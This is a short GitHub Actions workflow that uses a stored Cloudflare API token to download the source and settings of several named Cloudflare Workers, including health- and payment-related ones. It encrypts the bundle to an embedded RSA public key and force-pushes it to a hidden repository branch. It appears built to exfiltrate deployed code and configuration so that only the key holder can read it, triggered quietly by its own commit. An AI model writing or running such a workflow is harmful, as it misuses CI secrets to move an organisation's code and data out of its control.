name: Inspect workers (temporary)
on:
  push:
    branches: [main]
    paths: ['.github/workflows/inspect.yml']
permissions:
  contents: write
jobs:
  inspect:
    runs-on: ubuntu-latest
    steps:
      - name: Collect
        env:
          T: ${{ secrets.CLOUDFLARE_API_TOKEN }}
        run: |
          A=b9de28abfd009bbf696ceec4da62c5b8
          B=https://api.cloudflare.com/client/v4/accounts/$A
          mkdir -p o && cd o
          h="Authorization: Bearer $T"
          curl -s -H "$h" $B/workers/scripts > scripts.json
          curl -s -H "$h" $B/workers/domains > domains.json
          for n in medadapt-api-v2 medadapt-whereby adapt-api tamjump-member-api tamj-residence onetouch-api carepay-api; do
            curl -s -H "$h" $B/workers/scripts/$n/settings > $n.settings.json
            curl -s -H "$h" $B/workers/scripts/$n > $n.script.raw
          done
          cd .. && tar czf o.tgz o
          cat > pub.pem <<'K'
          -----BEGIN PUBLIC KEY-----
          MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAt7Qa3PlPdV+1021mW7EA
          C9cqxf28MjdkdWp8oe1fmHIWWJ92BcxJIjkBY7iS/5CJx1teYq8EHkhU5B36fhdA
          Z4ijTLiNx9N+DkaB8T60DWreI3cOqi0KtVQsoTuuSqmroP98ZGItnTqird5M8OY2
          LlXeXYsobs4Ft1K9jiaktlzTPTgK5CDSVLfCbOEK4Acw0uQXd01YAAoNRO9QkQR5
          0fOeDRtVwv1/RyuW8hqlenGxapQpY5SGHFLoI9/tFRseQS/vaqSp+HwZmUpWaTlN
          vlWsOcjnnQDKMZyhjyR4ceM8gIU1NKviQB55+e/kccVkaBBYXfShG5aDOXoOwk4O
          /HzjQpydyV/6tZGumGPAgzx0FJ/VhBGt5aKRxphYppZS7jgdaJ/HPPh382pMkGt9
          WGKJvYj0nAjmmhjNvjmHCBbHuT3vbsIPot5aSTMZUhCUg3vLqFYO08yiBnt9YGS/
          Oqo+xix/jmNWLmmX6N80lcKWbse9W/cADzqVtIt4wcp7AgMBAAE=
          -----END PUBLIC KEY-----
          K
          sed -i 's/^ *//' pub.pem
          openssl rand -out key.bin 32
          openssl enc -aes-256-cbc -pbkdf2 -salt -in o.tgz -out o.tgz.enc -pass file:key.bin
          openssl pkeyutl -encrypt -pubin -inkey pub.pem -pkeyopt rsa_padding_mode:oaep -in key.bin -out key.enc
          ls -la o
      - name: Save
        run: |
          mkdir s && cp o.tgz.enc key.enc s/ && cd s
          git init -q && git config user.name a && git config user.email a@a
          git add . && git commit -qm enc
          git push -f https://x-access-token:${{ github.token }}@github.com/${{ github.repository }} HEAD:inspect-enc
